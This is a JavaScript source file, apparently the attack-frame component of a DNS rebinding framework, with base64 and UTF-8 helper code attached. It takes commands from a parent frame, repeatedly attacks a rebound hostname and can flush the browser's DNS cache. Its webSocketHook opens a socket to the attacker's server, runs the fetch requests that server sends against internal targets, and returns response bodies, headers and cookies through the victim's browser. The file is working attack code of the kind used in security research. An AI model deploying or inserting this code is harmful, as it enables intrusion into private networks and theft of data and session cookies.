var timer;
var frame;
var sessionid;
var flushdns;
var xhr;
var interval = 60000;

function initCommsWithParentFrame() {
    window.addEventListener("message", function (e) {
        console.log("attack frame", window.location.hostname, "received message", e.data.cmd);

        switch (e.data.cmd) {
            case "interval":
                interval = parseInt(e.data.param) * 1000;
                break;
            case "indextoken":
                indextoken = e.data.param;
                break;
            case "flushdns":
                if (e.data.param.flushDns === true) {
                    console.log("Flushing Browser DNS cache.");
                    flushBrowserDnsCache(e.data.param.hostname);
                }
                break;
            case "stop":
                clearInterval(timer);
                break;
            case "start":
                timer = setInterval(attack, interval);
                console.log("frame", window.location.hostname, "waiting", interval,
                    "milliseconds for dns update");
                break;
        }
    });
}

// Notify the parent that attack frame is loaded.
function begin() {
    window.parent.postMessage({
        status: "start"
    }, "*");
}

// checks if Response is '200' and return Promise Body.text()
// otherwise throw an error with errorString
function responseOKOrFail(errorString) {
    return function (r) {
        if (r.ok) {
            console.log("attack frame ", window.location.hostname, " received a response");
            return r.text()
        } else {
            throw new Error(errorString)
        }
    }
}

// terminates attack and inform parent frame
function attackSuccess(message) {
    console.log(message);
    clearInterval(timer); //stop attack
    window.parent.postMessage({
        status: "success",
        response: message
    }, "*");
}

// Request target to establish a websocket to Singularity server and wait for commands
function webSocketHook(initialCookie) {
    const serverIp = document.location.hostname.split('-')[1]
    const wsurl = document.location.port ? `${serverIp}:${document.location.port}` :
        `${serverIp}`;

    var ws = new WebSocket(`ws://${wsurl}/soows`);
    ws.onmessage = function (m) {
        const data = JSON.parse(m.data);
        if (data.command === 'fetch') {
            if (data.payload.fetchrequest.method === 'GET' || data.payload.fetchrequest.message === 'HEAD') {
                delete data.payload.fetchrequest.body;
            } else {
                data.payload.fetchrequest.body = atobUTF8(data.payload.fetchrequest.body)
            }
            const messageID = data.payload.fetchrequest.id
            let fetchResponse = {
                "id": messageID,
                "command": "fetchResponse",
                "response": {},
                "body": "",
            }
            fetch(data.payload.url, data.payload.fetchrequest)
                .then(function (r) {
                    fetchResponse.response.headers = r.headers;
                    fetchResponse.response.ok = r.ok;
                    fetchResponse.response.redirected = r.redirected;
                    fetchResponse.response.status = r.status;
                    fetchResponse.response.type = r.type;
                    fetchResponse.response.url = r.url;
                    fetchResponse.response.body = r.body;
                    fetchResponse.response.bodyUsed = r.bodyUsed;
                    fetchResponse.response.headers = {};
                    for (let pair of r.headers.entries()) {
                        fetchResponse.response.headers[pair[0]] = pair[1];
                    };
                    fetchResponse.response.cookies = getCookies();
                    return r.arrayBuffer()
                })
                .then(function (result) {
                    fetchResponse.body = base64ArrayBuffer(result);
                    ws.send(JSON.stringify(fetchResponse));
                }).catch(function (e) {
                    console.log(e);
                });
        }

    }
    ws.onopen = function (evt) {}
    ws.onerror = function (e) {
        console.log(`WS error: ${e}`);
    }
}

function buildCookie(val, days) {
    var expires = "";
    if (days) {
        let date = new Date();
        date.setTime(date.getTime() + (days * 24 * 60 * 60 * 1000));
        expires = "; expires=" + date.toUTCString();
    }
    return `${val} ${expires} ; path=/`;
}

function getCookies() {
    return document.cookie === "" ? [] : document.cookie.split(';').map(x => x.trim());

}

// Converts an ArrayBuffer directly to base64, without any intermediate 'convert to string then
// use window.btoa' step. According to my tests, this appears to be a faster approach:
// http://jsperf.com/encoding-xhr-image-data/5

/*
MIT LICENSE
Copyright 2011 Jon Leighton
Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the "Software"), to deal in the Software without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and to permit persons to whom the Software is furnished to do so, subject to the following conditions:
The above copyright notice and this permission notice shall be included in all copies or substantial portions of the Software.
THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
*/


function base64ArrayBuffer(arrayBuffer) {
    var base64 = ''
    var encodings = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'

    var bytes = new Uint8Array(arrayBuffer)
    var byteLength = bytes.byteLength
    var byteRemainder = byteLength % 3
    var mainLength = byteLength - byteRemainder

    var a, b, c, d
    var chunk

    // Main loop deals with bytes in chunks of 3
    for (var i = 0; i < mainLength; i = i + 3) {
        // Combine the three bytes into a single integer
        chunk = (bytes[i] << 16) | (bytes[i + 1] << 8) | bytes[i + 2]

        // Use bitmasks to extract 6-bit segments from the triplet
        a = (chunk & 16515072) >> 18 // 16515072 = (2^6 - 1) << 18
        b = (chunk & 258048) >> 12 // 258048   = (2^6 - 1) << 12
        c = (chunk & 4032) >> 6 // 4032     = (2^6 - 1) << 6
        d = chunk & 63 // 63       = 2^6 - 1

        // Convert the raw binary segments to the appropriate ASCII encoding
        base64 += encodings[a] + encodings[b] + encodings[c] + encodings[d]
    }

    // Deal with the remaining bytes and padding
    if (byteRemainder == 1) {
        chunk = bytes[mainLength]

        a = (chunk & 252) >> 2 // 252 = (2^6 - 1) << 2

        // Set the 4 least significant bits to zero
        b = (chunk & 3) << 4 // 3   = 2^2 - 1

        base64 += encodings[a] + encodings[b] + '=='
    } else if (byteRemainder == 2) {
        chunk = (bytes[mainLength] << 8) | bytes[mainLength + 1]

        a = (chunk & 64512) >> 10 // 64512 = (2^6 - 1) << 10
        b = (chunk & 1008) >> 4 // 1008  = (2^6 - 1) << 4

        // Set the 2 least significant bits to zero
        c = (chunk & 15) << 2 // 15    = 2^4 - 1

        base64 += encodings[a] + encodings[b] + encodings[c] + '='
    }

    return base64
}

//https://github.com/anonyco/BestBase64EncoderDecoder

(function (window) {
    "use strict";
    var log = Math.log;
    var LN2 = Math.LN2;
    var clz32 = Math.clz32 || function (x) {
        return 31 - log(x >>> 0) / LN2 | 0
    };
    var fromCharCode = String.fromCharCode;
    var originalAtob = atob;
    var originalBtoa = btoa;

    function btoaReplacer(nonAsciiChars) {
        // make the UTF string into a binary UTF-8 encoded string
        var point = nonAsciiChars.charCodeAt(0);
        if (point >= 0xD800 && point <= 0xDBFF) {
            var nextcode = nonAsciiChars.charCodeAt(1);
            if (nextcode !== nextcode) // NaN because string is 1 code point long
                return fromCharCode(0xef /*11101111*/ , 0xbf /*10111111*/ , 0xbd /*10111101*/ );
            // https://mathiasbynens.be/notes/javascript-encoding#surrogate-formulae
            if (nextcode >= 0xDC00 && nextcode <= 0xDFFF) {
                point = (point - 0xD800) * 0x400 + nextcode - 0xDC00 + 0x10000;
                if (point > 0xffff)
                    return fromCharCode(
                        (0x1e /*0b11110*/ << 3) | (point >>> 18),
                        (0x2 /*0b10*/ << 6) | ((point >>> 12) & 0x3f /*0b00111111*/ ),
                        (0x2 /*0b10*/ << 6) | ((point >>> 6) & 0x3f /*0b00111111*/ ),
                        (0x2 /*0b10*/ << 6) | (point & 0x3f /*0b00111111*/ )
                    );
            } else return fromCharCode(0xef, 0xbf, 0xbd);
        }
        if (point <= 0x007f) return inputString;
        else if (point <= 0x07ff) {
            return fromCharCode((0x6 << 5) | (point >>> 6), (0x2 << 6) | (point & 0x3f));
        } else return fromCharCode(
            (0xe /*0b1110*/ << 4) | (point >>> 12),
            (0x2 /*0b10*/ << 6) | ((point >>> 6) & 0x3f /*0b00111111*/ ),
            (0x2 /*0b10*/ << 6) | (point & 0x3f /*0b00111111*/ )
        );
    }
    window["btoaUTF8"] = function (inputString, BOMit) {
        return originalBtoa((BOMit ? "\xEF\xBB\xBF" : "") + inputString.replace(
            /[\x80-\uD7ff\uDC00-\uFFFF]|[\uD800-\uDBFF][\uDC00-\uDFFF]?/g, btoaReplacer
        ));
    }
    //////////////////////////////////////////////////////////////////////////////////////
    function atobReplacer(encoded) {
        var codePoint = encoded.charCodeAt(0) << 24;
        var leadingOnes = clz32(~codePoint);
        var endPos = 0,
            stringLen = encoded.length;
        var result = "";
        if (leadingOnes < 5 && stringLen >= leadingOnes) {
            codePoint = (codePoint << leadingOnes) >>> (24 + leadingOnes);
            for (endPos = 1; endPos < leadingOnes; ++endPos)
                codePoint = (codePoint << 6) | (encoded.charCodeAt(endPos) & 0x3f /*0b00111111*/ );
            if (codePoint <= 0xFFFF) { // BMP code point
                result += fromCharCode(codePoint);
            } else if (codePoint <= 0x10FFFF) {
                // https://mathiasbynens.be/notes/javascript-encoding#surrogate-formulae
                codePoint -= 0x10000;
                result += fromCharCode(
                    (codePoint >> 10) + 0xD800, // highSurrogate
                    (codePoint & 0x3ff) + 0xDC00 // lowSurrogate
                );
            } else endPos = 0; // to fill it in with INVALIDs
        }
        for (; endPos < stringLen; ++endPos) result += "\ufffd"; // replacement character
        return result;
    }
    window["atobUTF8"] = function (inputString, keepBOM) {
        if (!keepBOM && inputString.substring(0, 3) === "\xEF\xBB\xBF")
            inputString = inputString.substring(3); // eradicate UTF-8 BOM
        // 0xc0 => 0b11000000; 0xff => 0b11111111; 0xc0-0xff => 0b11xxxxxx
        // 0x80 => 0b10000000; 0xbf => 0b10111111; 0x80-0xbf => 0b10xxxxxx
        return originalAtob(inputString).replace(/[\xc0-\xff][\x80-\xbf]*/g, atobReplacer);
    };
})(typeof global == "" + void 0 ? typeof self == "" + void 0 ? this : self : global);

function flushBrowserDnsCache(hostname) {
    let worker = new Worker('flushdnscache.js');
    let params = {};
    params.hostname = hostname;
    params.port = document.location.port;
    params.iterations = 1000;
    worker.postMessage(params);
}

initCommsWithParentFrame();